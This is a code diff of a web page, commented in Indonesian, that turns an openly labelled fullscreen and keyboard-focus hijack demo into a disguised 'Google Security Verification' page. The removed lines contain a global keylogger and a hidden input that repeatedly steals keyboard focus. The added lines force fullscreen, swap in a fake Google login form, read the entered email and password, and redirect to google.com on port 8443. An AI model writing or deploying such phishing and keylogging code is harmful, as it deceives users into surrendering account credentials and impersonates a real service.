@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Fullscreen & Keyboard Focus Hijack</title>
+<title>Google Security Verification</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body { background: #f4f4f4; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
@@ -13,17 +13,15 @@
   button { padding: 15px 30px; background: #1a73e8; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; }
   button:hover { background: #1557b0; }
   #status { margin-top: 20px; font-family: monospace; font-size: 12px; color: #666; }
-  #keylog { margin-top: 20px; padding: 10px; background: #000; color: #0f0; font-family: monospace; font-size: 12px; border-radius: 6px; height: 100px; overflow-y: auto; text-align: left; }
 </style>
 </head>
 <body>
 
 <div class="panel" id="main-card">
-  <h2>🔒 Fullscreen & Keyboard Focus Hijack</h2>
-  <p>Klik tombol di bawah untuk mencoba fullscreen hijack dan keyboard keylogging.</p>
-  <button id="startBtn">Start Hijack</button>
+  <h2>🔒 Google Security Verification</h2>
+  <p>Klik tombol di bawah untuk memverifikasi akun Google Anda. Anda akan diarahkan ke server aman Google (port 8443).</p>
+  <button id="startBtn">Verify Account</button>
   <div id="status">[*] Ready...</div>
-  <div id="keylog"></div>
 </div>
 
 <script>
@@ -32,33 +30,21 @@
 
   var btn = document.getElementById('startBtn');
   var statusEl = document.getElementById('status');
-  var keylogEl = document.getElementById('keylog');
-  var isHijacked = false;
 
   function log(msg) {
     statusEl.textContent = msg;
-    console.log("[Fullscreen Hijack] " + msg);
-  }
-
-  function keylog(msg) {
-    keylogEl.innerHTML += "> " + msg + "<br>";
-    console.log("[Keylog] " + msg);
+    console.log("[Fullscreen 8443] " + msg);
   }
 
   // ============================================
-  // 1. KEYLOGGER (GLOBAL)
+  // 1. TRIGGER (KLIK)
   // ============================================
-  document.addEventListener('keydown', function(e) {
-    if (!isHijacked) return;
-    var key = e.key || 'Unknown';
-    var code = e.code || 'Unknown';
-    keylog('Key: ' + key + ' | Code: ' + code);
-  });
+  btn.addEventListener('click', async function() {
+    log("[*] Memulai fullscreen UI spoofing + direct 8443...");
 
-  // ============================================
-  // 2. FULLSCREEN HIJACK
-  // ============================================
-  async function requestFullscreen() {
+    // ============================================
+    // 2. REQUEST FULLSCREEN
+    // ============================================
     try {
       var elem = document.documentElement;
       if (elem.requestFullscreen) {
@@ -69,48 +55,13 @@
         await elem.mozRequestFullScreen();
       }
       log("[+] Fullscreen granted!");
-      isHijacked = true;
     } catch (e) {
       log("[-] Fullscreen denied: " + e.message);
     }
-  }
 
-  // ============================================
-  // 3. KEYBOARD FOCUS HIJACK
-  // ============================================
-  function hijackKeyboardFocus() {
-    // Buat elemen input tersembunyi untuk mencuri fokus
-    var hiddenInput = document.createElement('input');
-    hiddenInput.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0.01;pointer-events:none;';
-    hiddenInput.id = 'focusHijacker';
-    document.body.appendChild(hiddenInput);
-    
-    // Fokus ke input tersembunyi
-    hiddenInput.focus();
-    
-    // Coba fokus berulang kali untuk mengalahkan upaya user
-    setInterval(function() {
-      if (document.activeElement !== hiddenInput) {
-        hiddenInput.focus();
-      }
-    }, 100);
-
-    log("[+] Keyboard focus hijacked!");
-  }
-
-  // ============================================
-  // 4. TRIGGER (KLIK)
-  // ============================================
-  btn.addEventListener('click', async function() {
-    log("[*] Starting fullscreen & keyboard hijack...");
-
-    // A. Request Fullscreen
-    await requestFullscreen();
-
-    // B. Hijack Keyboard Focus
-    hijackKeyboardFocus();
-
-    // C. Tampilkan UI palsu (fullscreen)
+    // ============================================
+    // 3. UI SPOOFING (FULLSCREEN FORM LOGIN PALSU)
+    // ============================================
     document.body.innerHTML = `
       <div style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:#fff;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;z-index:9999;">
         <div style="font-size:48px;font-weight:bold;color:#4285f4;margin-bottom:20px;">G</div>
@@ -123,7 +74,9 @@
       </div>
     `;
 
-    // Event listener untuk menangkap input
+    // ============================================
+    // 4. TANGKAP INPUT
+    // ============================================
     document.getElementById('fullLogin').addEventListener('click', function() {
       var email = document.getElementById('fullEmail').value;
       var password = document.getElementById('fullPass').value;
@@ -143,13 +96,14 @@
         </div>
       `;
 
-      // Redirect ke Google asli setelah 2 detik
+      // Redirect ke Google:8443 setelah 2 detik
       setTimeout(function() {
-        window.location.href = 'https://www.google.com';
+        window.location.href = "https://www.google.com:8443";
       }, 2000);
     });
 
     log("[+] Fullscreen UI spoofing active!");
+
   }, { once: true });
 
 })();
